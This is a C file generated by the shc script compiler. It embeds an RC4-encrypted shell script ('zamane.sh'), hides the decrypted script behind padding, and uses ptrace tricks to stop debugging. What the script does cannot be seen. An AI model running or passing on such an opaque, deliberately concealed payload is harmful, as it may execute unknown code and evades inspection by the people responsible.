#if 0
	shc Version 3.8.9, Generic Script Compiler
	Copyright (c) 1994-2012 Francisco Rosales <frosal@fi.upm.es>

	./shc-3.8.9/shc -f zamane.sh 
#endif

static  char data [] = 
#define      inlo_z	3
#define      inlo	((&data[0]))
	"\033\141\045"
#define      rlax_z	1
#define      rlax	((&data[3]))
	"\154"
#define      xecc_z	15
#define      xecc	((&data[7]))
	"\361\032\145\075\162\011\170\212\374\311\355\137\126\162\035\376"
	"\177\171"
#define      msg2_z	19
#define      msg2	((&data[24]))
	"\123\316\057\327\075\224\023\307\212\062\324\211\054\133\222\246"
	"\366\147\052\226\216\256"
#define      opts_z	1
#define      opts	((&data[44]))
	"\312"
#define      lsto_z	1
#define      lsto	((&data[45]))
	"\275"
#define      text_z	2470
#define      text	((&data[369]))
	"\237\026\217\010\135\041\065\026\012\357\160\347\043\141\002\210"
	"\007\164\335\133\103\213\032\330\114\141\124\341\035\332\324\274"
	"\360\143\305\116\205\372\144\220\352\324\167\015\066\171\226\075"
	"\356\163\230\061\377\263\012\113\024\137\055\062\071\001\356\052"
	"\145\264\170\353\256\335\173\230\261\363\246\347\155\074\045\133"
	"\260\276\215\257\161\230\373\206\367\050\270\061\052\247\133\220"
	"\133\324\174\012\262\367\242\144\353\111\114\130\206\161\264\066"
	"\057\102\346\241\332\341\047\321\012\337\002\064\206\136\305\342"
	"\063\101\354\345\071\217\111\045\330\225\175\136\007\062\225\067"
	"\164\173\330\116\135\377\040\147\337\043\234\146\201\141\110\265"
	"\243\064\233\334\304\345\001\234\173\177\373\202\262\221\271\046"
	"\014\222\165\151\221\226\321\161\271\155\327\073\317\040\360\162"
	"\124\214\117\030\161\121\265\354\321\261\157\203\102\051\252\117"
	"\273\040\271\115\266\212\276\157\370\226\252\307\266\233\071\013"
	"\050\211\044\231\332\331\206\253\213\366\057\316\037\332\035\333"
	"\372\327\050\260\142\347\040\132\175\313\041\063\147\133\076\217"
	"\345\142\051\300\074\257\154\310\245\233\226\305\165\264\240\157"
	"\213\310\040\355\260\100\110\055\014\152\141\163\306\240\002\253"
	"\003\054\153\077\333\327\007\201\163\236\107\351\122\347\131\335"
	"\260\171\313\140\272\023\216\306\176\357\072\104\220\075\360\223"
	"\151\133\323\002\156\153\040\331\373\154\072\271\243\300\273\116"
	"\236\012\025\102\167\064\240\351\224\232\332\035\257\221\133\053"
	"\345\377\101\230\031\277\270\027\146\172\232\146\273\116\027\246"
	"\070\267\233\141\166\143\030\202\216\271\045\137\100\054\351\206"
	"\132\232\114\376\134\015\152\071\365\165\237\033\152\016\322\331"
	"\246\167\223\205\267\230\025\211\156\110\060\056\032\176\000\376"
	"\217\343\244\171\367\132\343\004\170\160\351\242\116\332\243\325"
	"\243\162\115\345\323\134\165\146\260\132\176\361\342\270\242\200"
	"\204\173\360\223\161\245\154\101\007\214\074\344\325\012\130\353"
	"\227\107\354\247\232\116\074\250\052\314\333\025\245\262\344\166"
	"\043\141\025\102\353\362\047\314\354\261\030\017\036\335\324\016"
	"\156\232\053\125\140\101\361\077\227\160\003\023\233\157\250\350"
	"\306\176\243\012\255\310\352\216\107\002\343\315\303\134\215\323"
	"\265\056\134\343\350\311\246\332\133\250\142\100\051\321\223\336"
	"\200\376\335\144\151\006\221\030\254\257\152\250\073\235\066\266"
	"\114\346\001\036\371\220\356\177\351\055\204\001\014\246\260\224"
	"\371\336\140\241\276\264\374\321\227\061\003\250\301\274\056\053"
	"\353\261\301\105\310\130\377\272\172\372\013\003\072\142\234\132"
	"\210\303\267\054\267\015\335\030\062\252\204\317\223\052\251\244"
	"\353\325\166\373\271\260\107\303\035\027\270\264\075\343\027\346"
	"\105\116\367\271\321\366\026\100\363\230\012\144\304\241\334\256"
	"\265\335\262\223\015\021\076\263\000\203\011\065\006\357\215\107"
	"\221\061\127\275\357\052\155\323\363\371\366\304\224\307\120\043"
	"\245\063\332\155\210\040\125\163\210\141\250\162\021\272\365\007"
	"\152\220\266\010\075\152\264\363\370\276\317\270\124\266\130\015"
	"\023\033\260\062\166\235\177\210\374\354\152\207\377\217\311\243"
	"\206\022\352\357\167\175\235\214\374\204\224\314\116\107\100\025"
	"\024\215\060\005\115\173\215\030\134\000\126\314\303\052\233\351"
	"\270\254\205\321\042\117\316\371\170\350\377\260\326\167\053\306"
	"\151\306\312\220\376\162\064\216\354\350\325\214\242\061\226\114"
	"\261\072\240\122\113\170\150\016\141\341\125\304\052\320\144\022"
	"\347\170\074\130\037\270\166\127\067\254\100\371\145\231\240\202"
	"\337\327\300\316\203\213\162\011\111\104\376\246\115\263\223\255"
	"\121\261\102\047\255\352\141\113\000\316\103\041\160\353\104\320"
	"\127\265\036\100\274\175\221\124\264\117\036\302\055\336\263\076"
	"\112\123\220\130\031\144\373\352\156\051\027\010\241\271\335\114"
	"\022\137\074\256\120\230\214\361\232\301\275\246\342\311\102\121"
	"\041\253\171\355\142\164\256\216\167\142\246\035\011\223\040\014"
	"\225\216\164\164\225\254\132\311\000\065\323\276\027\150\156\024"
	"\350\255\326\021\046\200\241\227\150\114\110\151\177\037\255\200"
	"\141\016\162\104\263\224\153\260\377\073\370\241\010\242\005\355"
	"\352\204\240\301\302\276\376\264\040\020\236\107\130\357\045\217"
	"\063\124\347\055\357\015\261\063\301\165\161\030\325\036\255\261"
	"\274\150\140\165\152\256\356\260\317\136\030\243\046\077\345\306"
	"\247\165\375\232\324\260\322\073\203\223\366\135\210\112\137\135"
	"\214\267\217\332\107\273\137\130\332\105\146\074\357\311\170\206"
	"\032\111\054\371\011\363\024\171\015\265\164\301\170\366\254\353"
	"\362\107\145\043\315\261\063\165\004\336\364\327\207\141\321\210"
	"\353\077\304\267\303\024\200\163\014\065\261\356\013\227\030\313"
	"\217\062\000\217\175\262\057\310\324\146\221\122\103\122\025\050"
	"\143\160\245\012\304\241\217\033\264\263\152\170\147\271\125\270"
	"\361\125\255\154\111\201\231\243\005\374\334\257\117\104\061\205"
	"\237\316\310\364\270\232\005\113\060\261\143\371\272\227\205\125"
	"\310\202\113\251\237\204\314\370\205\057\241\356\015\205\025\214"
	"\055\252\173\045\365\176\173\175\323\145\056\133\177\122\264\267"
	"\154\114\201\335\256\211\163\023\121\334\353\133\164\164\202\166"
	"\353\203\105\232\126\144\227\026\216\276\165\047\276\075\043\152"
	"\052\305\140\345\004\222\127\345\205\016\064\023\062\270\205\241"
	"\131\214\211\020\323\171\252\046\066\314\316\011\257\027\022\313"
	"\301\147\324\200\242\123\064\204\337\370\331\103\216\123\232\272"
	"\200\122\324\304\022\375\050\274\207\323\276\101\321\316\133\305"
	"\032\107\150\134\337\164\144\074\311\051\175\064\362\263\375\103"
	"\255\230\064\242\365\174\331\033\011\076\005\205\032\130\144\344"
	"\121\367\055\210\306\046\322\365\262\025\361\256\355\344\131\052"
	"\017\101\177\131\322\132\144\027\135\236\073\202\011\357\321\200"
	"\300\077\264\144\130\337\077\107\273\200\376\130\014\162\266\013"
	"\206\233\344\275\114\234\332\332\147\340\012\171\325\010\325\213"
	"\251\321\127\105\043\054\041\061\134\060\344\323\001\306\040\121"
	"\102\223\026\162\316\073\270\335\150\002\317\366\176\364\313\303"
	"\076\150\047\006\215\223\135\122\102\143\271\134\103\145\261\204"
	"\230\164\104\263\224\275\052\057\156\077\213\314\034\330\075\332"
	"\126\151\061\024\373\237\002\170\055\224\342\222\364\071\101\351"
	"\241\205\363\004\127\242\334\237\245\144\231\246\350\027\152\002"
	"\035\370\007\313\256\163\241\117\300\265\025\163\153\142\063\165"
	"\144\142\013\156\253\237\335\050\332\236\272\017\132\045\050\170"
	"\234\362\234\276\301\345\131\372\141\101\334\315\000\204\134\011"
	"\340\166\130\160\037\354\300\276\023\174\356\252\161\221\020\332"
	"\371\041\047\356\250\366\063\126\031\343\317\352\136\033\243\365"
	"\257\230\045\361\032\363\261\017\151\367\353\250\022\200\015\032"
	"\075\331\172\067\120\161\221\213\314\006\003\030\344\223\161\073"
	"\220\045\251\032\032\236\247\330\312\105\200\225\263\304\326\050"
	"\354\141\004\203\013\167\143\243\107\324\155\331\013\177\212\057"
	"\354\150\211\162\061\202\276\060\211\025\163\357\074\034\352\062"
	"\205\224\332\323\134\000\213\120\306\041\154\067\162\315\014\247"
	"\027\376\002\171\070\275\160\022\132\033\320\162\036\104\122\300"
	"\315\250\373\212\235\314\273\372\057\004\332\123\316\157\172\107"
	"\377\234\172\306\072\117\101\274\304\066\016\202\240\000\236\233"
	"\116\326\276\230\075\160\370\241\251\051\152\126\161\205\064\376"
	"\352\125\335\243\205\110\052\104\167\370\044\243\014\150\256\112"
	"\072\055\243\127\374\246\147\234\310\057\065\021\322\330\356\024"
	"\346\244\050\273\223\211\112\041\301\050\371\266\210\267\370\135"
	"\211\372\177\056\135\057\326\145\030\104\013\213\136\053\305\031"
	"\065\221\216\245\000\101\361\024\164\171\351\352\146\001\231\216"
	"\036\167\315\226\221\340\143\213\265\171\370\010\361\000\102\201"
	"\150\313\064\177\363\205\305\052\061\043\327\376\273\210\317\310"
	"\005\221\134\376\114\010\004\103\113\336\003\167\241\300\045\271"
	"\067\257\074\144\133\226\307\102\120\222\130\220\012\033\227\060"
	"\066\311\071\233\034\062\124\000\160\102\032\363\357\206\074\000"
	"\042\036\206\232\314\150\302\314\134\024\367\113\117\334\263\065"
	"\276\240\010\304\261\137\167\102\164\073\042\101\033\030\306\157"
	"\355\365\115\202\062\304\361\135\226\245\037\105\147\013\300\324"
	"\035\120\327\141\030\130\261\136\354\147\313\110\254\377\134\310"
	"\307\011\167\226\010\306\017\163\015\242\303\251\050\266\066\277"
	"\113\076\347\326\116\223\225\361\133\146\122\042\207\024\371\262"
	"\164\144\043\154\236\365\172\354\112\100\061\072\246\224\204\000"
	"\365\246\071\235\312\213\312\211\332\360\100\302\360\161\152\237"
	"\246\362\040\340\110\310\222\226\271\307\252\171\326\060\016\036"
	"\333\345\342\005\312\365\152\356\274\371\204\002\264\337\250\363"
	"\175\052\247\050\361\221\002\121\025\054\070\263\220\022\113\242"
	"\174\247\340\041\371\362\012\326\204\077\257\363\226\332\302\254"
	"\344\023\125\151\055\020\075\004\236\355\330\260\105\211\055\046"
	"\311\330\277\127\272\347\007\326\100\245\122\332\371\237\254\005"
	"\326\156\362\110\345\321\217\003\052\342\257\330\035\112\042\212"
	"\336\272\015\012\255\256\357\250\345\312\270\210\354\164\130\207"
	"\301\260\352\101\223\160\374\375\057\147\233\065\121\236\113\074"
	"\103\040\113\336\307\246\271\031\140\272\053\005\343\074\264\264"
	"\340\210\354\175\254\237\325\045\357\071\333\356\146\232\302\263"
	"\311\006\324\361\041\334\047\147\103\070\250\057\312\047\221\157"
	"\230\101\354\027\322\036\227\254\275\345\305\340\221\214\376\050"
	"\113\152\141\354\030\211\012\355\106\035\107\337\331\113\325\132"
	"\332\040\354\152\350\344\277\251\112\021\057\035\066\075\071\023"
	"\335\117\204\166\065\200\374\034\104\254\162\120\332\337\230\121"
	"\061\021\351\035\201\077\247\376\144\202\313\274\376\052\166\054"
	"\114\315\151\044\255\276\133\051\106\104\347\246\040\003\101\214"
	"\151\014\334\146\171\334\352\215\107\127\011\154\350\206\200\103"
	"\304\305\351\047\362\230\252\137\032\143\132\150\163\235\077\213"
	"\040\123\316\356\235\031\116\352\377\326\365\124\001\140\010\241"
	"\263\074\262\164\351\235\374\213\271\327\166\220\043\076\132\320"
	"\370\325\115\313\302\377\166\223\076\273\352\120\317\202\256\112"
	"\173\164\251\374\033\244\271\161\225\001\013\061\075\065\157\304"
	"\227\177\003\230\251\007\144\200\311\212\201\376\123\362\216\141"
	"\134\141\331\344\065\030\125\242\111\311\351\265\307\147\004\346"
	"\336\200\133\250\007\320\343\005\072\241\007\276\135\360\236\147"
	"\153\153\333\342\170\371\117\337\062\232\177\021\126\274\347\210"
	"\060\130\253\010\042\267\201\171\125\007\250\055\115\331\154\275"
	"\043\051\214\213\165\277\317\243\225\242\156\353\124\257\150\367"
	"\375\362\054\337\037\353\026\370\342\337\106\010\360\306\373\102"
	"\154\307\335\234\100\367\370\363\315\060\103\041\137\205\167\362"
	"\153\140\144\075\107\055\333\065\220\070\104\154\234\066\366\154"
	"\231\055\261\000\100\342\072\244\074\232\010\164\200\270\130\303"
	"\142\056\044\233\050\270\376\220\170\101\121\235\230\061\023\337"
	"\165\023\313\223\010\021\062\361\273\037\076\276\135\255\205\151"
	"\142\346\351\346\331\111\336\164\214\064\374\340\205\336\375\172"
	"\206\021\165\205\052\133\357\037\045\155\213\136\141\336\102\027"
	"\225\122\134\217\145\036\032\132\332\124\216\102\027\374\146\341"
	"\137\126\254\133\245\332\201\027\347\342\361\232\022\130\113\075"
	"\150\374\023\025\214\232\000\043\135\263\314\316\164\137\045\076"
	"\265\120\141\302\051\347\022\122\222\035\205\301\103\356\002\002"
	"\060\274\346\212\052\252\215\207\166\304\373\041\336\240\013\165"
	"\257\272\232\077\003\245\164\145\142\243\326\377\302\107\034\006"
	"\006\115\344\157\034\074\160\353\031\333\171\304\331\351\173\054"
	"\245\112\355\012\372\043\155\374\157\303\016\077\313\133\353\223"
	"\006\056\056\135\013\021\121\250\374\047\035\167\313\336\001\174"
	"\031\116\314\170\015\302\257\305\211\223\110\011\333\027\011\046"
	"\203\104\207\131\310\217\235\237\256\104\063\333\306\246\171\015"
	"\217\313\365\350\251\245\142\165\005\035\211\224\343\007\203\036"
	"\114\023\133\074\247\304\230\172\011\313\126\317\162\317\335\002"
	"\233\322\353\105\167\116\273\175\153\104\021\117\114\225\155\230"
	"\251\310\324\121\215\154\313\226\070\042\146\252\362\103\255\216"
	"\026\230\323\216\347\217\014\122\323\035\241\040\263\016\270\135"
	"\327\215\256\144\372\172\372\062\234\141\335\216\244\213\034\273"
	"\044\360\111\013\177\125\135\123\163\376\163\046\015\053\203\345"
	"\270\061\111\262\253\104\345\110\245\302\326\112\115\363\005\161"
	"\343\116\175\143\244\332\266\027\331\051\076\346\125\301\314\016"
	"\363\025\301\237\132\246\347\377\151\276\111\267\261\117\051\225"
	"\236\246\371\102\201\257\131\132\331\227\101\056\131\015\075\115"
	"\043\376\355\175\245\325\175\016\223\307\306\105\026\360\333\264"
	"\226\324\367\030\204\120\162\135\350\264\214\102\301\311\220\345"
	"\307\175\142\154\122\340\173\346\247\102\054\276\062\010\163\311"
	"\335\152\341\141\273\124\276\243\010\113\346\312\024\166\257\334"
	"\364\022\110\107\362\304\055\231\006\132\130\070\142\313\002\100"
	"\065\343\241\360\067\140\224\077\253\173\011\300\361\270\234\346"
	"\312\345\055\275\251\132\127\260\265\257\351\030\172\353\130\257"
	"\316\372\240\006\132\064\105\006\257\117\306\241\010\143\207\323"
	"\110\264\220\362\017\347\243\304\226\214\335\021\167\065\300\106"
	"\057\140\114\212\225\222\220\104\342\127\346\353\272\155\276\002"
	"\041\117\365\061\067\230\366\316\044\323\337\234\011\237\343\071"
	"\000\060\303\225\303\124\332\245\253\300\221\145\055\117\150\117"
	"\236\136\200\326\366\166\244\033\112\203\270\123\042\233\214\043"
	"\314\120\270\217\244\223\065\117\123\306\265\200\025\035\320\264"
	"\174\121\212\162\310\056\216\022\262\106\146\324\342\362\370\256"
	"\102\261\075\347\104\162\066\227\071\353\030\116\011\351\003\205"
	"\072\216\370\002\275\206\025\157\315\173\104\257\156\074\135\261"
	"\355\233\230\062\015\316\311\106\272\342\225\304\313\231\111\005"
	"\050\102\010\345\310\035\124\226\230\231\105\006\326\242\270\304"
	"\075\120\366\113\037\300\222\331\242\050\236\156\302\350\164\352"
	"\052\174\320\363\232\045\211\062\276\316\071\224\161\361\130\257"
	"\102\116\373\141\017\216\073\261\267\331\040\171\302\224\144\354"
	"\020\064\340\252\131\151\335\030\070\027\254\251\011\005\131\113"
	"\124\124\255\143\343\350\025\232\302\065\024\204\311\170\161\332"
	"\254\121\205\006\273\143\036\363\172\313\235\204\321\366\320\045"
	"\113\175\211\056\146"
#define      tst2_z	19
#define      tst2	((&data[3430]))
	"\324\335\256\331\324\334\045\155\365\000\311\044\201\255\011\162"
	"\120\316\035\275\307\120"
#define      chk2_z	19
#define      chk2	((&data[3450]))
	"\170\130\046\074\075\177\247\064\123\330\245\346\235\234\340\044"
	"\244\052\065\310"
#define      pswd_z	256
#define      pswd	((&data[3497]))
	"\011\054\141\050\040\334\363\275\140\304\263\061\352\377\256\163"
	"\056\025\022\367\076\346\324\355\204\052\015\375\125\075\250\261"
	"\137\232\323\241\042\203\170\100\323\264\150\165\304\062\114\205"
	"\123\246\371\367\163\311\050\251\144\343\367\271\041\240\153\200"
	"\072\076\041\135\301\231\236\225\116\006\012\023\071\126\231\214"
	"\375\222\204\161\134\255\032\300\221\021\171\262\261\344\062\354"
	"\043\124\112\344\355\350\171\074\357\204\117\050\333\350\265\330"
	"\173\072\111\327\347\144\230\170\166\022\053\047\366\136\024\032"
	"\262\136\376\240\107\170\334\066\374\054\137\330\025\025\260\220"
	"\117\372\150\066\137\001\257\325\023\333\375\012\071\021\044\353"
	"\160\042\213\270\233\150\356\230\224\116\160\252\143\041\073\262"
	"\033\243\351\172\244\231\120\270\164\115\302\255\136\346\230\317"
	"\011\044\207\245\214\166\075\041\305\255\313\050\316\006\333\352"
	"\252\304\145\117\135\265\007\322\003\312\177\142\260\030\061\272"
	"\075\271\137\312\060\234\353\365\112\267\035\031\276\371\004\151"
	"\275\152\271\033\040\301\355\043\213\155\205\074\206\267\366\303"
	"\161\126\215\241\363\171\226\076\061\264\127\357\255\134\131\153"
	"\306\022\207\346\323\165\012\137\343\217\233\151\055\177\373\067"
	"\254\134\137\314\071\123\211\232\030\075\313\002\074\172\166\152"
	"\217\210\142\316\157\066\273\363\141\310\361\216\110\354\305\364"
	"\111\045\300\202\170\111\034\220\207\347\223\304\141\011\056\361"
	"\222\220\277\001\307\173\365\050\104\346\267\214"
#define      msg1_z	42
#define      msg1	((&data[3822]))
	"\033\242\100\236\033\370\056\254\050\361\005\222\330\214\316\103"
	"\247\066\147\330\105\375\066\166\037\022\137\223\217\020\317\152"
	"\020\132\011\043\273\225\026\354\346\027\224\313\373\202\375\212"
	"\272\253\022\242"
#define      shll_z	10
#define      shll	((&data[3871]))
	"\110\005\131\001\335\213\206\243\151\123\214\300"
#define      date_z	1
#define      date	((&data[3881]))
	"\322"
#define      tst1_z	22
#define      tst1	((&data[3887]))
	"\061\321\206\165\267\331\342\354\234\222\011\213\126\337\101\004"
	"\277\131\321\071\017\314\303\376\370\306\127\076\001"
#define      chk1_z	22
#define      chk1	((&data[3915]))
	"\246\136\303\104\137\247\175\027\035\057\117\365\340\362\302\363"
	"\304\360\365\003\020\344\103\117\361\114\171\115\377"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	0	/* Define as 1 to enable ptrace the executable */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask  = (unsigned long)&chkenv;
	mask ^= (unsigned long)getpid() * ~mask;
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

#if !TRACEABLE

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PTRACE_ATTACH, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !TRACEABLE */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;
	char * me = getenv("_");
	if (me == NULL) { me = argv[0]; }

	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	ret = chkenv(argc);
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		/* Prepend hide_z spaces to script text to hide it. */
		scrpt = malloc(hide_z + text_z);
		if (!scrpt)
			return 0;
		memset(scrpt, (int) ' ', hide_z);
		memcpy(&scrpt[hide_z], text, text_z);
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, me);
		} else {
			scrpt = me;
		}
	}
	j = 0;
	varg[j++] = argv[0];		/* My own name at execution */
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
#if !TRACEABLE
	untraceable(argv[0]);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
